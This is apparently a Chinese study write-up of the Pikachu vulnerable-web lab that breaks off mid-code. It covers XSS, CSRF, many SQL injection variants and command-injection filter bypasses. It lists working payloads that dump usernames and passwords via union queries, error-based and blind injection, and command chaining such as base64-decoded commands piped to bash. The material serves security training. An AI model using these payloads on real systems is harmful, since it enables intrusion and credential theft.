<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">htmlspecialchars(<span class="hljs-type">string</span>,flags,character-<span class="hljs-keyword">set</span>,double_encode)<br>预定义的字符是：<br>&amp; （和号）成为 &amp;<br><span class="hljs-string">&quot; （双引号）成为 &quot;</span><br><span class="hljs-comment">&#x27; （单引号）成为 &#x27;</span><br>&lt; （小于）成为 &lt;<br>&gt; （大于）成为 &gt;<br><span class="hljs-symbol">strings:</span>规定要转换的字符串(必选，其余皆为可选)<br><br><span class="hljs-symbol">flags:</span><br>可用的引号类型:<br>ENT_COMPAT - 仅编码双引号(默认)。<br>ENT_QUOTES - 编码双引号和单引号。<br>ENT_NOQUOTES - 不编码任何引号。<br><br>无效的编码:<br>ENT_IGNORE - 忽略无效的编码，而不是让函数返回一个空的字符串。应尽量避免，因为这可能对安全性有影响。<br>ENT_SUBSTITUTE - 把无效的编码替代成一个指定的带有 <span class="hljs-keyword">Unicode</span> 替代字符 U+FFFD（UTF-<span class="hljs-number">8</span>）或者 &amp;#FFFD; 的字符，而不是返回一个空的字符串。<br>ENT_DISALLOWED - 把指定文档类型中的无效代码点替代成 <span class="hljs-keyword">Unicode</span> 替代字符 U+FFFD（UTF-<span class="hljs-number">8</span>）或者 &amp;#FFFD;。<br><br>character-<span class="hljs-keyword">set</span>：规定了要使用的字符集的字符串；默认为utf-<span class="hljs-number">8</span><br><br>double_encode：规定了是否编码已存在的 HTML 实体；为bool型(<span class="hljs-literal">TRUE</span>/<span class="hljs-literal">FALSE</span>)<br><br><span class="hljs-symbol">ps:</span>$test = htmlspecialchars($name, ENT_QUOTES);<br></code></pre></td></tr></table></figure>
<p>此处xss漏洞可能存在的原因是：htmlspecialchars()函数默认对双引号编码，开发者不对单引号进行过滤( flags != ENT_QUOTES )的话就可能导致xss发送</p>
<p>payload:</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-string">&#x27; onclick=&#x27;</span>alert<span class="hljs-comment">(1)</span><span class="hljs-string">&#x27;  #第一个单引号构造闭合；其后两个单引号确保参数不被过滤</span><br></code></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/13/lOBqcQizpEeoL32.png" srcset="/img/loading.gif"></p>
<p><img src="https://i.loli.net/2021/02/13/px138UhcSXsrZFn.png" srcset="/img/loading.gif"></p>
<p>这里也可以用</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&#x27; onclick=&#x27;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure>
<p>输入’ onclick=’alert(1)，检查如下：</p>
<p><img src="https://i.loli.net/2021/02/13/B3ol2DxtfuWyCOJ.png" srcset="/img/loading.gif"></p>
<p>则可直接’ onclick=’alert(1)即可构造闭合</p>
<p><img src="https://i.loli.net/2021/02/13/GHZ3l2Mh6cdVeY5.png" srcset="/img/loading.gif"></p>
<h2 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h2><p>当输出在a标签里的href属性时，可以用js协议来执行js代码</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">javascript</span>:<span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-variable">document.cookie</span>)</span><br></code></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/13/agRLiSwItMkbPpc.png" srcset="/img/loading.gif"></p>
<h2 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h2><p>先尝试<code>javascript:alert(document.cookie)</code></p>
<p><img src="https://i.loli.net/2021/02/13/6MujQIK5EToaROw.png" srcset="/img/loading.gif"></p>
<p>发现我们的输入被插入到了<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>之间<img src="https://i.loli.net/2021/02/13/1uqfpyblSezWXaM.png" srcset="/img/loading.gif"></p>
<p>可以根据此构造闭合：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">javascript:alert(<span class="hljs-built_in">document</span>.cookie)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/13/SWBmEryhnje5VMt.png" srcset="/img/loading.gif"></p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>利用目标用户的合法身份，以目标用户的名义执行某些非法操作</p>
<p>CSRF与xss差别就在于：xss利用站内用户信任点，CSRF利用</p>
<h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>修改的参数以get形式传输，由此可以伪造链接给受害者点击</p>
<p><img src="https://i.loli.net/2021/02/13/VWMkeIBN2mc8Evn.png" srcset="/img/loading.gif"></p>
<h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>修改的信息以post形式传输</p>
<p><img src="https://i.loli.net/2021/02/13/ladkx4vpMRymZKV.png" srcset="/img/loading.gif"></p>
<p>这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单，如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">http://wooyun.org/csrf.php</span> <span class="hljs-attr">method</span>=<span class="hljs-string">POST</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;xx&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;11&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"> <span class="hljs-built_in">document</span>.forms[<span class="hljs-number">0</span>].submit(); </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br></code></pre></td></tr></table></figure>
<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作</p>
<h2 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h2><p>利用Token防止CSRF机制：</p>
<p>CSRF的主要问题是敏感操作的链接容易被伪造，添加Token，每次请求,都增加一个随机码(利用算法，生成不可猜测的token随机码) , 后台在每次登录时都对随机码token进行验证，与服务端生成的session进行比较。</p>
<p><strong>Token</strong>：</p>
<p>目前主流的做法是使用Token抵御CSRF攻击。下面通过分析CSRF 攻击来理解为什么Token能够有效</p>
<p>CSRF攻击要成功的条件在于攻击者能够预测所有的参数从而构造出合法的请求。所以根据不可预测性原则，我们可以对参数进行加密从而防止CSRF攻击。</p>
<p>另一个更通用的做法是保持原有参数不变，另外添加一个参数Token，其值是随机的。这样攻击者因为不知道Token而无法构造出合法的请求进行攻击。</p>
<p><strong>Token 使用原则</strong></p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">Token</span>要足够随机————只有这样才算不可预测<br><span class="hljs-keyword">Token</span>是一次性的，即每次请求成功后要更新<span class="hljs-keyword">Token</span>————这样可以增加攻击难度，增加预测难度<br><span class="hljs-keyword">Token</span>要注意保密性————敏感操作使用<span class="hljs-keyword">post</span>，防止<span class="hljs-keyword">Token</span>出现在URL中<br></code></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/13/iagwKEedYIApjRT.png" srcset="/img/loading.gif"></p>
<h1 id="sql-inject"><a href="#sql-inject" class="headerlink" title="sql-inject"></a>sql-inject</h1><p>可以打一下sqli-libs~~~</p>
<h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>post、数字型：1 and 1=1 #正常回显；1 and 1=2 #非正常</p>
<p>如图</p>
<p><img src="https://i.loli.net/2021/02/13/pC2H5kLJMeocsWv.png" srcset="/img/loading.gif"></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">id=<span class="hljs-number">-1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>		#判断字段数<br>id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">--+		#爆表名</span><br>id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+			#爆列名</span><br>id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(username,<span class="hljs-number">0x2b</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users<span class="hljs-comment">--+			#爆数据</span><br><br></code></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/13/tPZqCKzXlvcyROn.png" srcset="/img/loading.gif"></p>
<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>get、字符型：id=1’ #保错，id=1’ –+ # 正常</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">name</span>=1&#x27; order by 2--+<br>?<span class="hljs-attribute">name</span>=1&#x27; union select 1,2--+<br>?<span class="hljs-attribute">name</span>=-1&#x27; union select 1,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=database()--+		#爆表名<br>?<span class="hljs-attribute">name</span>=-1&#x27; union select 1,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+			#爆列名<br>?<span class="hljs-attribute">name</span>=-1&#x27; union select 1,group_concat(username,0x2b,password) <span class="hljs-keyword">from</span> users--+			#爆数据<br><br></code></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/13/8m4BP6V2GSRJoig.png" srcset="/img/loading.gif"></p>
<h2 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h2><p>后端的sql查询语句使用了模糊差异如 <code>select id form 某表 like &#39; %xxx% &#39;</code></p>
<p>payload的构造：实际是将其通配符%闭合，</p>
<p>eg：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">xx%<span class="hljs-string">&#x27; or 1=1 #   </span><br><span class="hljs-string"></span><br><span class="hljs-string">传到后端的完整语句为：select id form 某表 like &#x27;</span> %xx%<span class="hljs-string">&#x27; or 1=1 #% &#x27;</span><br><br><span class="hljs-string">&#x27; and 1=1 and &#x27;</span>%<span class="hljs-string">&#x27;=&#x27;</span><br><br>传到后端的完整语句为：<span class="hljs-keyword">select</span> id form 某表 <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;%&#x27;</span>=<span class="hljs-string">&#x27;%&#x27;</span><br></code></pre></td></tr></table></figure>
<p>输入：’ and 1=1 and ‘%’=’</p>
<p>此时后端查询语句为：select name form 某表 like ‘%’ and 1=1 and ‘%’=’%’;like后的值都为1，故回显出此表的所有结果</p>
<p><img src="https://i.loli.net/2021/02/13/S2U5GDwlEnyYvM7.png" srcset="/img/loading.gif"></p>
<p>这里没有回显位，盲注一下：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">kob<span class="hljs-string">e&#x27; and length(database())=7 #				#正常回显,数据库长度为7</span><br><span class="hljs-string">kobe&#x27;</span> <span class="hljs-keyword">and</span> ord(substr(<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">112</span> #		<br>ord()返回括号内字符的asii码；substr(字符串,起始位置，字符数目)<br></code></pre></td></tr></table></figure>
<p>burpsuite一下：</p>
<p><img src="https://i.loli.net/2021/02/14/YLkPq2fuAZr6UFK.png" srcset="/img/loading.gif"></p>
<p>112 105 107 97 99 104 117   =》 p i k a c h u</p>
<h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><p>tip:管tmd的什么型,能够制造出闭合,就是本事</p>
<p>payload:</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">name</span>=<span class="hljs-number">1</span>&#x27;) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/14/HI5VlwvXSx4zM9a.png" srcset="/img/loading.gif"></p>
<h2 id="insert-update注入"><a href="#insert-update注入" class="headerlink" title="insert/update注入"></a>insert/update注入</h2><p>insert语句：在数据库中添加数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs mysql">两种形式：<br>1.INSERT...VALUES：<br>insert into &lt;表名&gt; [&lt;列名1&gt; [ , ...&lt;列名n&gt;]]<br>values (值1) [... , (值n) ];<br><br>2.INSERT...SET：<br>insert into &lt;表名&gt;<br>set &lt;列名1&gt; &#x3D; &lt;值1&gt;<br>	&lt;列名2&gt; &#x3D; &lt;值2&gt;<br>	...;<br></code></pre></td></tr></table></figure>
<p>update语句：修改、更新数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">update &lt;表名&gt; set 字段 1 &#x3D; 值 1 [,字段 2 &#x3D; 值 2… ] [where 子句 ]<br>[order by 子句] [limit 子句];<br></code></pre></td></tr></table></figure>


<h3 id="insert"><a href="#insert" class="headerlink" title="insert"></a>insert</h3><p>注册页面</p>
<p><img src="https://i.loli.net/2021/02/14/oUadxHfnustVOGp.png" srcset="/img/loading.gif"></p>
<p>则猜测后端语句为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">insert into 某表  (username,password,sex,phonenumber,address,home?) values (&#39;xxx&#39;,&#39;xxx&#39;,&#39;xxx&#39;,xxx,&#39;xxx&#39;,&#39;xxx&#39;);<br></code></pre></td></tr></table></figure>
<p>xxx即为我们输入的值，存在报错，构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mysql">xxx&#39; or (select updatexml(1,concat (0x7e,(select database()),0x7e),1)) or &#39;<br>xxx&#39; or updatexml(1,concat(0x7e,database()),0) or &#39;<br><br>因为存在两个必填项，必须在末尾加&#39;构造闭合，使得报错不是语法错误<br></code></pre></td></tr></table></figure>


<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p><img src="https://i.loli.net/2021/02/14/AqXZrg4VyFERtKG.png" srcset="/img/loading.gif"></p>
<p>猜测后端语句为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">update 某表 set sex &#x3D; &#39;xxx&#39;, phone &#x3D; &#39;xxx&#39;, add &#x3D; &#39;xxx&#39;, email &#x3D; &#39;xxx&#39; where name &#x3D;&#39;123&#39;;<br></code></pre></td></tr></table></figure>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$link</span>=connect();<br><span class="hljs-comment">// 判断是否登录，没有登录不能访问</span><br><span class="hljs-keyword">if</span>(!check_sqli_session(<span class="hljs-variable">$link</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;登录后才能进入会员中心哦&#x27;)&lt;/script&gt;&quot;</span>;<br>    header(<span class="hljs-string">&quot;location:sqli_login.php&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$html1</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;sex&#x27;</span>]!=<span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phonenum&#x27;</span>]!=<span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;add&#x27;</span>]!=<span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]!=<span class="hljs-literal">null</span>)&#123;<br><span class="hljs-comment">//        $getdata=escape($link, $_POST);</span><br><br>        <span class="hljs-comment">//未转义,形成注入,sql操作类型为update</span><br>        <span class="hljs-variable">$getdata</span>=<span class="hljs-variable">$_POST</span>;<br>        <span class="hljs-variable">$query</span>=<span class="hljs-string">&quot;update member set sex=&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;sex&#x27;]&#125;</span>&#x27;,phonenum=&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;phonenum&#x27;]&#125;</span>&#x27;,address=&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;add&#x27;]&#125;</span>&#x27;,email=&#x27;<span class="hljs-subst">&#123;$getdata[&#x27;email&#x27;]&#125;</span>&#x27; where username=&#x27;<span class="hljs-subst">&#123;$_SESSION[&#x27;sqli&#x27;][&#x27;username&#x27;]&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$result</span>=execute(<span class="hljs-variable">$link</span>, <span class="hljs-variable">$query</span>);<br>        <span class="hljs-keyword">if</span>(mysqli_affected_rows(<span class="hljs-variable">$link</span>)==<span class="hljs-number">1</span> || mysqli_affected_rows(<span class="hljs-variable">$link</span>)==<span class="hljs-number">0</span>)&#123;<br>            header(<span class="hljs-string">&quot;location:sqli_mem.php&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$html1</span>.=<span class="hljs-string">&#x27;修改失败，请重试&#x27;</span>;<br><br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>构造报错型注入payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">&#39; or (select updatexml(1,concat(0x7e,(select database()),0x7e),1)) #<br></code></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/14/E8g23vRF1aOd6Km.png" srcset="/img/loading.gif"></p>
<p><img src="https://i.loli.net/2021/02/14/9kFpNlBRWiQqsKu.png" srcset="/img/loading.gif"></p>
<h2 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h2><p>delete语句：删除数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">delete from &lt;表名&gt; [where 子句] [order by 子句] [limit 子句]<br></code></pre></td></tr></table></figure>
<p>点击删除=》传参作为删除的筛选条件</p>
<p>猜测后端为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">delete from 某表 where id &#x3D; xxx<br></code></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/14/k4DNhlxXSQ9arbd.png" srcset="/img/loading.gif"></p>
<p>可以看到参数：<code>id=62</code></p>
<p>在其后加上payload即可~(此处仍为报错注入)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">or (select updatexml(1,concat(0x7e,(select database()),0x7e),1)) #<br></code></pre></td></tr></table></figure>
<p>注：payload需进行html编码=》选中然后ctrl+u即可</p>
<p><img src="https://i.loli.net/2021/02/14/mwJIPvWHoMFy68Z.png" srcset="/img/loading.gif"></p>
<h2 id="http头注入"><a href="#http头注入" class="headerlink" title="http头注入"></a>http头注入</h2><p>http头注入的原理是前端获取参数值，然后将参数拼接到select语句中查询。即与数据库产生交互。</p>
<p>著需要找到http头中传参的地方，将payload输入即可</p>
<p>如图：显示头部信息user-agent、accept</p>
<p><img src="https://i.loli.net/2021/02/14/Fb2GILVsH9SKB5M.png" srcset="/img/loading.gif"></p>
<p>payload(此处仍是报错注入)：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">xxx</span>&#x27; or (select updatexml(<span class="hljs-number">1</span>,concat (<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e,(select database()),<span class="hljs-number">0</span>x<span class="hljs-number">7</span>e),<span class="hljs-number">1</span>)) or &#x27;<br></code></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/02/14/lUASyjYzIXb7B3J.png" srcset="/img/loading.gif"></p>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>布尔即true与false；结果正确与错误显示的页面不同，则猜测有布尔注入</p>
<p>判断：输入kobe正常回显，输入kobe’ and 1# 正常回显kobe信息；输入kobe’ and 0#  不存在</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mysql">kobe&#39; and length(database())&#x3D;7# <br>kobe&#39; and ord(substr(database(),1,1))&#x3D;112# <br>#burpsuite跑一下即可，消息操作看搜索型注入部分<br></code></pre></td></tr></table></figure>


<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>利用<code>sleep()</code>或<code>benchmark()</code>等函数使得命令执行时间变长，与<code>if(expr1,expr2,expr3)</code>搭配使用猜解数据库</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mysql">kobe&#39; and if (length ( database() ) &#x3D;7 , sleep(5) , 1) #<br>kobe&#39; and if (ord(substr(database(),1,1))&#x3D;112 , sleep(5) , 1) #<br></code></pre></td></tr></table></figure>


<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>适用：单引号被反斜杠转义&amp;&amp;数据库使用GBK编码(PHP中通过iconv()进行编码转换也可能存在宽字节字符注入)</p>
<blockquote>
<p>eg:<br>比如输入的id被 ‘包围，输入id=1’，程序不报错，但会多出一个反斜杠(id= ‘1&#39;‘)，此时输入的单引号被反斜杠转义，从而导致输入的单引号无法形成闭合。通常这种情况下此处是不存在sql注入漏洞的。<br>但数据库查询前执行了SET NAMES ‘GBK’语句，会将编码设置为宽字节GBK。造成此处的宽字节漏洞。</p>
</blockquote>
<p>原理：反斜杠编码为<code>%5c</code>，GBK编码中<code>%df%5c</code>为繁体字<code>運</code>,由此可绕过反斜杠转义 </p>
<p>利用：宽字节<code>%df</code>加<code>&#39;</code></p>
<p><img src="https://i.loli.net/2021/02/14/c4a8OsJQV3nrCYb.png" srcset="/img/loading.gif"></p>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p>RCE即remote command/code execute让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。</p>
<p>以下摘自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/SpouseLJ/p/13223967.html">CTF下的命令执行漏洞利用及绕过方法总结</a></p>
<p>管道符：</p>
<p>windows：<code>| </code>、<code>||</code> 、<code>&amp;</code>、<code>&amp;&amp;</code></p>
<p>linux：相比windows多了一个<code>;</code>,效果同<code>&amp;</code></p>
<p><code>|</code>：直接执行<code>|</code>后的语句</p>
<p><img src="https://i.loli.net/2021/02/14/fPMCoi2vwrZLqEG.png" srcset="/img/loading.gif"></p>
<p><code>||</code> : 取决于<code>||</code>前的命令正确与否：正确 =》只执行前面的语句；错误 =》执行后面的语句</p>
<p><img src="https://i.loli.net/2021/02/14/Lnb3di6JRCX1ewO.png" srcset="/img/loading.gif"></p>
<p><code>&amp;</code>：<code>&amp;</code>前后的命令都执行，无论前者是否正确</p>
<p><img src="https://i.loli.net/2021/02/14/YkzPoEb6XSRrUiQ.png" srcset="/img/loading.gif"></p>
<p><code>&amp;&amp;</code>：<code>&amp;&amp;</code>前命令为假则都不执行，为真则都执行</p>
<p><img src="https://i.loli.net/2021/02/14/5a1YThQz7Kj3GpN.png" srcset="/img/loading.gif"></p>
<p>bypass：</p>
<p>过滤空格bypass：</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">1.</span><span class="hljs-template-variable">&#123;IFS&#125;</span><br><span class="xml">2.<span class="hljs-tag">&lt;&gt;</span></span><br><span class="xml">3.PHP环境下%09</span><br></code></pre></td></tr></table></figure>
<p>黑名单bypass：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk">拼接：a=c;b=at;c=fl;d=ag;<span class="hljs-variable">$a</span><span class="hljs-variable">$b</span> <span class="hljs-variable">$c</span><span class="hljs-variable">$d</span><br>编码：Y2F0IGZsYWc= 即 cat flag<br>	echo <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d|bash<br>	`echo <span class="hljs-string">&quot;Y2F0IGZsYWc=&quot;</span>|base64 -d`<br>单、双引号：c<span class="hljs-string">&quot;&quot;</span>at fl<span class="hljs-string">&#x27;&#x27;</span>ag<br>反斜线：c\at fl\ag<br><span class="hljs-variable">$1</span>、<span class="hljs-variable">$2</span>...以及<span class="hljs-variable">$@</span>:c<span class="hljs-variable">$1at</span> fl<span class="hljs-variable">$@ag</span><br>内联执行绕过：`命令`和$(命令)都是执行命令的方式<br>			echo <span class="hljs-string">&quot;xx`pwd`&quot;</span><br>			echo <span 